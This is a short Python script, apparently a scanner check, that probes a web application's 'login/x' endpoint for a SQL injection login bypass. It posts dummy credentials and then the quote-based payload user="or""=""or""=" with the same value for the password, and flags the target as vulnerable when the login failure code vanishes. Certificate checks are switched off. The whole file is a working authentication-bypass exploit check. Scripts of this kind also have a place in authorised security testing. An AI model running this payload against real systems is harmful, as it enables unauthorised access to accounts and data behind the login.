import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"login/x"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
	body='user=adminasdas&pass=adasd'
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if '"recode":1' in response.text:
		r0=True
	else:
		r0=False
	url=baseurl+"login/x"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
	body='user="or""=""or""="&pass="or""=""or""="'
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if '"recode":1'  not in response.text:
		r1=True
	else:
		r1=False
	if r0 and r1:
		return True
	else:
		return False
